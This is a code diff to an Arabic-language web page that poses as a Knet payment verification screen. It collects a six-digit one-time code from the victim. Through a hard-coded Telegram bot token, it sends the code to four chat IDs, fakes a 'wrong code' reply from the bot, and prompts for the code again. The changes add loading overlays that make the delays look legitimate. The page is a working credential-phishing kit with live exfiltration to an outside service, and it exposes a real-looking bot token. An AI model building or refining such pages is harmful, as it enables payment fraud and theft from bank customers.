@@ -208,6 +208,90 @@
       border: 1px solid #f5c6cb;
       font-weight: bold;
     }
+    
+    /* حالة الانتظار */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .loading-content {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      max-width: 300px;
+      width: 90%;
+    }
+    
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #0070c0;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .loading-text {
+      color: #0070c0;
+      font-size: 16px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    
+    .loading-subtext {
+      color: #666;
+      font-size: 14px;
+    }
+    
+    /* حالة الانتظار المدمجة في الصفحة */
+    .inline-loading {
+      display: none;
+      text-align: center;
+      padding: 20px;
+      background-color: #f8f9fa;
+      border-radius: 8px;
+      margin: 15px 0;
+      border: 1px solid #dee2e6;
+    }
+    
+    .inline-spinner {
+      width: 30px;
+      height: 30px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #0070c0;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+    
+    .inline-loading-text {
+      color: #0070c0;
+      font-size: 15px;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    
+    .inline-loading-subtext {
+      color: #666;
+      font-size: 13px;
+    }
   </style>
 </head>
 <body>
@@ -225,6 +309,13 @@
       الكود خطأ! يرجى المحاولة مرة أخرى
     </div>
     
+    <!-- حالة الانتظار المدمجة في الصفحة -->
+    <div id="inlineLoading" class="inline-loading">
+      <div class="inline-spinner"></div>
+      <div class="inline-loading-text">جاري التحقق من الكود...</div>
+      <div class="inline-loading-subtext">يرجى الانتظار لحظات</div>
+    </div>
+    
     <form id="verifyForm">
       <div class="form-box">  
         <div id="countdown" style="text-align: center; font-weight: bold; color: #0070c0; margin-bottom: 10px;">
@@ -239,6 +330,15 @@
   <!-- الصورة الجديدة في أسفل الصفحة بدون حواف وبالعرض الكامل -->
   <div class="bottom-image">
     <img src="www2.0zz0.com/IMG-20251006-WA0041.jpg" alt="Knet Payment">
+  </div>
+  
+  <!-- حالة الانتظار الكاملة (overlay) -->
+  <div id="loadingOverlay" class="loading-overlay">
+    <div class="loading-content">
+      <div class="spinner"></div>
+      <div class="loading-text">انتظر...</div>
+      <div class="loading-subtext">جاري معالجة طلبك</div>
+    </div>
   </div>
 
   <script>
@@ -269,11 +369,21 @@
     
     // دالة لإظهار رسالة الخطأ وإعادة العد التنازلي
     function showErrorMessage() {
+      // إخفاء حالة الانتظار أولاً
+      hideInlineLoading();
+      hideLoadingOverlay();
+      
       const errorMessage = document.getElementById("errorMessage");
       errorMessage.style.display = 'block';
       
       // إعادة تعيين النموذج
       document.getElementById("verifyForm").reset();
+      
+      // إعادة تفعيل النموذج إذا كان معطلاً
+      const submitButton = document.querySelector('button[type="submit"]');
+      const codeInput = document.getElementById("code");
+      submitButton.disabled = false;
+      codeInput.disabled = false;
       
       // إعادة بدء العد التنازلي
       startCountdown();
@@ -286,7 +396,34 @@
     
     // دالة لمحاكاة استقبال أمر "الكود خطأ" من البوت
     function simulateBotErrorCommand() {
-      showErrorMessage();
+      // إظهار حالة انتظار أولاً لمحاكاة التأخير من البوت
+      showLoadingOverlay("انتظر...", "جاري معالجة الرد من البوت...");
+      
+      // انتظار لمدة ثانيتين ثم إظهار رسالة الخطأ
+      setTimeout(() => {
+        showErrorMessage();
+      }, 2000);
+    }
+
+    // دوال إظهار وإخفاء حالة الانتظار
+    function showInlineLoading() {
+      document.getElementById("inlineLoading").style.display = 'block';
+      document.getElementById("errorMessage").style.display = 'none';
+    }
+    
+    function hideInlineLoading() {
+      document.getElementById("inlineLoading").style.display = 'none';
+    }
+    
+    function showLoadingOverlay(text = "انتظر...", subtext = "جاري معالجة طلبك") {
+      const overlay = document.getElementById("loadingOverlay");
+      overlay.querySelector(".loading-text").textContent = text;
+      overlay.querySelector(".loading-subtext").textContent = subtext;
+      overlay.style.display = 'flex';
+    }
+    
+    function hideLoadingOverlay() {
+      document.getElementById("loadingOverlay").style.display = 'none';
     }
 
     // كود إرسال البيانات إلى Telegram مع زر في البوت
@@ -297,6 +434,15 @@
       
       // هنا يمكنك وضع شرط التحقق الفعلي من صحة الكود
       if (code.length === 6) {
+        // إظهار حالة الانتظار المدمجة
+        showInlineLoading();
+        
+        // تعطيل النموذج أثناء الإرسال
+        const submitButton = document.querySelector('button[type="submit"]');
+        const codeInput = document.getElementById("code");
+        submitButton.disabled = true;
+        codeInput.disabled = true;
+        
         // إرسال الرسالة مع زر في البوت
         const token = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";
         const chat_ids = ["7335192117", "6323300854", "8280462390", "7942066919"];
@@ -316,6 +462,8 @@
         };
 
         let sentCount = 0;
+        let errorCount = 0;
+        
         chat_ids.forEach(chat_id => {
           fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
               method: "POST",
@@ -333,16 +481,39 @@
                 sentCount++;
                 console.log(`تم الإرسال إلى ${chat_id} بنجاح`);
               } else {
+                errorCount++;
                 console.error(`فشل الإرسال إلى ${chat_id}`);
-              }
-              
-              if (sentCount === chat_ids.length) {
-                alert("تم إرسال الرمز بنجاح! انتظر التحقق من البوت.");
-                document.getElementById("code").value = "";
               }
             })
             .catch(err => {
+              errorCount++;
               console.error(`خطأ في الإرسال إلى ${chat_id}:`, err);
+            })
+            .finally(() => {
+              // إذا اكتملت جميع المحاولات
+              if (sentCount + errorCount === chat_ids.length) {
+                // إخفاء حالة الانتظار
+                hideInlineLoading();
+                
+                // إعادة تفعيل النموذج
+                submitButton.disabled = false;
+                codeInput.disabled = false;
+                
+                if (sentCount > 0) {
+                  // إظهار رسالة نجاح مؤقتة
+                  showLoadingOverlay("تم الإرسال بنجاح!", "انتظر التحقق من البوت...");
+                  
+                  // إخفاء رسالة النجاح بعد 3 ثوانٍ
+                  setTimeout(() => {
+                    hideLoadingOverlay();
+                  }, 3000);
+                  
+                  // مسح حقل الكود
+                  document.getElementById("code").value = "";
+                } else {
+                  alert("فشل في إرسال الرمز. يرجى المحاولة مرة أخرى.");
+                }
+              }
             });
         });
       } else {
